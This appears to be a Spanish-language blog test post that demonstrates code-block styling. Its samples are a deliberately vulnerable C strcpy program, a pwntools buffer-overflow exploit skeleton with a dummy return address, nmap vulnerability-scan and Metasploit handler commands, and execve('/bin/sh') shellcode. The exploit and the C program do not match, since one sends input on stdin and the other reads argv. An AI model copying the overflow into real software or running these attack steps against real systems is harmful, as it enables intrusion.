---
layout: post
title: Ejemplo de snippets de código
categories: [test]
permalink: "blog/ejemplo-codigo"
published: yes
---

Así se ve el código `inline` y los bloques en el nuevo estilo.

## Stack buffer overflow (C)

```c
#include <stdio.h>
#include <string.h>
#define BUFLEN 16

// vulnerable: copia sin comprobar límites
int main(int argc, char **argv) {
    char buf[BUFLEN];
    strcpy(buf, argv[1]);   // stack overflow aquí
    printf("%s\n", buf);
    return 0;
}
```

## Exploit (Python)

```python
#!/usr/bin/env python3
from pwn import *

def exploit(offset=32):
    payload = b"A" * offset      # padding hasta RIP
    payload += p64(0xdeadbeef)   # dirección de retorno
    return payload

io = process("./vuln")
io.sendline(exploit())
io.interactive()
```

## Enumeración (bash)

```bash
$ nmap -sV --script=vuln 10.0.0.5
$ msfconsole -q -x "use exploit/multi/handler; run"
```

## Assembly

```asm
; pop shell
xor    rax, rax
push   rax
mov    rdi, 0x68732f6e69622f   ; "/bin/sh"
push   rdi
mov    rdi, rsp
mov    al, 59                  ; execve
syscall
```
